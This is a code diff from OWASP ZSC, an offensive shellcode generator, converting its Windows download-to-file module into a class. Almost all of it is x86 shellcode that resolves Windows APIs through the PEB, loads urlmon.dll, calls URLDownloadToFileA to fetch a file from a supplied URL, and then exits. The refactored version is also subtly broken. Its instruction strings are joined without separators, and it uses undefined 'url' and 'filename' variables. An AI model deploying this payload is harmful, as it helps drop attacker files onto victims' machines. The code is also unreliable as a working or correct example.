@@ -7,108 +7,107 @@ http://api.z3r0d4y.com/
 https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
 """
 from cores import stack
+from new_cores import base_module
 
 
-def download_tofile(url, filename):
-    return '''
-xor    %ecx,%ecx
-mov    %fs:0x30(%ecx),%eax
-mov    0xc(%eax),%eax
-mov    0x14(%eax),%esi
-lods   %ds:(%esi),%eax
-xchg   %eax,%esi
-lods   %ds:(%esi),%eax
-mov    0x10(%eax),%ebx
-mov    0x3c(%ebx),%edx
-add    %ebx,%edx
-mov    0x78(%edx),%edx
-add    %ebx,%edx
-mov    0x20(%edx),%esi
-add    %ebx,%esi
-xor    %ecx,%ecx
-inc    %ecx
-lods   %ds:(%esi),%eax
-add    %ebx,%eax
-cmpl   $0x50746547,(%eax)
-jne    23 <.text+0x23>
-cmpl   $0x41636f72,0x4(%eax)
-jne    23 <.text+0x23>
-cmpl   $0x65726464,0x8(%eax)
-jne    23 <.text+0x23>
-mov    0x24(%edx),%esi
-add    %ebx,%esi
-mov    (%esi,%ecx,2),%cx
-dec    %ecx
-mov    0x1c(%edx),%esi
-add    %ebx,%esi
-mov    (%esi,%ecx,4),%edx
-add    %ebx,%edx
-xor    %esi,%esi
-mov    %edx,%esi
-xor    %ecx,%ecx
-push   %ecx
-push   $0x41797261
-push   $0x7262694c
-push   $0x64616f4c
-push   %esp
-push   %ebx
-call   *%edx
-xor    %ecx,%ecx
-mov    $0x6c6c,%cx
-push   %ecx
-push   $0x642e6e6f
-push   $0x6d6c7275
-push   %esp
-call   *%eax
-xor    %ecx,%ecx
-push   %ecx
-mov    $0x4165,%cx
-push   %ecx
-push   $0x6c69466f
-push   $0x5464616f
-push   $0x6c6e776f
-push   $0x444c5255
-mov    %esp,%ecx
-push   %ecx
-push   %eax
-call   *%esi
-xor    %ecx,%ecx
-push   %ecx
-{0}
-xor    %edi,%edi
-mov    %esp,%edi
-xor    %ecx,%ecx
-push   %ecx
-{1}
-xor    %edx,%edx
-mov    %esp,%edx
-xor    %ecx,%ecx
-push   %ecx
-push   %ecx
-push   %edx
-push   %edi
-push   %ecx
-call   *%eax
-xor    %ecx,%ecx
-push   %ecx
-push   $0x73736590
-pop    %ecx
-shr    $0x8,%ecx
-push   %ecx
-push   $0x636f7250
-push   $0x74697845
-push   %esp
-push   %ebx
-call   *%esi
-xor    %ecx,%ecx
-push   %ecx
-call   *%eax
-'''.format(url, filename)
+class Module(base_module.BaseModule):
+    url = base_module.OptString("", "URL to download")  # TODO improve descr
+    file_dest = base_module.OptString("", "File name")  # TODO improve descr
 
+    def generate(self):
+        payload = "xor    %ecx,%ecx"
+        payload += "mov    %fs:0x30(%ecx),%eax"
+        payload += "mov    0xc(%eax),%eax"
+        payload += "mov    0x14(%eax),%esi"
+        payload += "lods   %ds:(%esi),%eax"
+        payload += "xchg   %eax,%esi"
+        payload += "lods   %ds:(%esi),%eax"
+        payload += "mov    0x10(%eax),%ebx"
+        payload += "mov    0x3c(%ebx),%edx"
+        payload += "add    %ebx,%edx"
+        payload += "mov    0x78(%edx),%edx"
+        payload += "add    %ebx,%edx"
+        payload += "mov    0x20(%edx),%esi"
+        payload += "add    %ebx,%esi"
+        payload += "xor    %ecx,%ecx"
+        payload += "inc    %ecx"
+        payload += "lods   %ds:(%esi),%eax"
+        payload += "add    %ebx,%eax"
+        payload += "cmpl   $0x50746547,(%eax)"
+        payload += "jne    23 <.text+0x23>"
+        payload += "cmpl   $0x41636f72,0x4(%eax)"
+        payload += "jne    23 <.text+0x23>"
+        payload += "cmpl   $0x65726464,0x8(%eax)"
+        payload += "jne    23 <.text+0x23>"
+        payload += "mov    0x24(%edx),%esi"
+        payload += "add    %ebx,%esi"
+        payload += "mov    (%esi,%ecx,2),%cx"
+        payload += "dec    %ecx"
+        payload += "mov    0x1c(%edx),%esi"
+        payload += "add    %ebx,%esi"
+        payload += "mov    (%esi,%ecx,4),%edx"
+        payload += "add    %ebx,%edx"
+        payload += "xor    %esi,%esi"
+        payload += "mov    %edx,%esi"
+        payload += "xor    %ecx,%ecx"
+        payload += "push   %ecx"
+        payload += "push   $0x41797261"
+        payload += "push   $0x7262694c"
+        payload += "push   $0x64616f4c"
+        payload += "push   %esp"
+        payload += "push   %ebx"
+        payload += "call   *%edx"
+        payload += "xor    %ecx,%ecx"
+        payload += "mov    $0x6c6c,%cx"
+        payload += "push   %ecx"
+        payload += "push   $0x642e6e6f"
+        payload += "push   $0x6d6c7275"
+        payload += "push   %esp"
+        payload += "call   *%eax"
+        payload += "xor    %ecx,%ecx"
+        payload += "push   %ecx"
+        payload += "mov    $0x4165,%cx"
+        payload += "push   %ecx"
+        payload += "push   $0x6c69466f"
+        payload += "push   $0x5464616f"
+        payload += "push   $0x6c6e776f"
+        payload += "push   $0x444c5255"
+        payload += "mov    %esp,%ecx"
+        payload += "push   %ecx"
+        payload += "push   %eax"
+        payload += "call   *%esi"
+        payload += "xor    %ecx,%ecx"
+        payload += "push   %ecx"
+        payload += stack.generate(url, "%ecx", "string")
+        payload += "xor    %edi,%edi"
+        payload += "mov    %esp,%edi"
+        payload += "xor    %ecx,%ecx"
+        payload += "push   %ecx"
+        payload += stack.generate(filename, "%ecx","string")
+        payload += "xor    %edx,%edx"
+        payload += "mov    %esp,%edx"
+        payload += "xor    %ecx,%ecx"
+        payload += "push   %ecx"
+        payload += "push   %ecx"
+        payload += "push   %edx"
+        payload += "push   %edi"
+        payload += "push   %ecx"
+        payload += "call   *%eax"
+        payload += "xor    %ecx,%ecx"
+        payload += "push   %ecx"
+        payload += "push   $0x73736590"
+        payload += "pop    %ecx"
+        payload += "shr    $0x8,%ecx"
+        payload += "push   %ecx"
+        payload += "push   $0x636f7250"
+        payload += "push   $0x74697845"
+        payload += "push   %esp"
+        payload += "push   %ebx"
+        payload += "call   *%esi"
+        payload += "xor    %ecx,%ecx"
+        payload += "push   %ecx"
+        payload += "call   *%eax"
+        return payload
 
-def run(data):
-    url = data[0]
-    filename = data[1]
-    return download_tofile(
-        stack.generate(url, "%ecx", "string"), stack.generate(filename, "%ecx",
-                                                              "string"))
+    def run(self):
+        print(self.generate())
